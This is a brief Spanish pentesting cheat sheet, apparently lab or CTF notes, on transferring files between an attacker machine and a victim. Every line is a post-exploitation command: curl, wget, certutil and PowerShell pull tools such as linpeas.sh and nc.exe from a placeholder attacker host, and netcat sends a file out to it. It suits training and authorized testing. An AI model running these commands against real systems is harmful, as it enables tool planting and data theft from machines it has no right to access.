# Transferir ficheros

## Servir desde tu máquina (atacante)
python3 -m http.server 8000           # http://TU_IP:8000/
smbserver.py share . -smb2support     # SMB: \\TU_IP\share
nc -lvnp 4444 > recibido.bin          # recibir por netcat

## Descargar en la víctima
curl http://TU_IP:8000/linpeas.sh -o linpeas.sh
wget http://TU_IP:8000/linpeas.sh
nc TU_IP 4444 < fichero               # enviar por netcat

## En Windows (víctima)
certutil -urlcache -f http://TU_IP:8000/nc.exe nc.exe
powershell -c "Invoke-WebRequest http://TU_IP:8000/f.exe -OutFile f.exe"
